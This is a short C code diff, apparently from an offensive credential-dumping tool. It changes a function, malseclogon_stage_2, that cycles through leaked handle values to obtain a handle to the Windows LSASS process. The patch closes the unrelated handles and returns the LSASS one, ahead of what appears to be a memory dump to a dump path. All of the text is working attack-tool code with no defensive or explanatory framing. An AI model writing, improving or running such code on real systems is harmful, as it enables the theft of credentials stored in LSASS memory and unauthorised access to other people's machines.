@@ -420,15 +420,19 @@ HANDLE malseclogon_stage_2(
     if (file_exists(dump_path))
         return NULL;
 
+    BOOL found_handle = FALSE;
+    HANDLE hProcess = NULL;
     for (DWORD leakedHandle = 4; leakedHandle <= 4 * 6; leakedHandle = leakedHandle + 4)
     {
-        if (!is_lsass((HANDLE)(ULONG_PTR)leakedHandle))
+        if (found_handle || !is_lsass((HANDLE)(ULONG_PTR)leakedHandle))
         {
             NtClose((HANDLE)(ULONG_PTR)leakedHandle);
             continue;
         }
-        return (HANDLE)(ULONG_PTR)leakedHandle;
+        // found LSASS handle, close all the other ones
+        hProcess = (HANDLE)(ULONG_PTR)leakedHandle;
+        found_handle = TRUE;
     }
-    return NULL;
+    return hProcess;
 }
 #endif
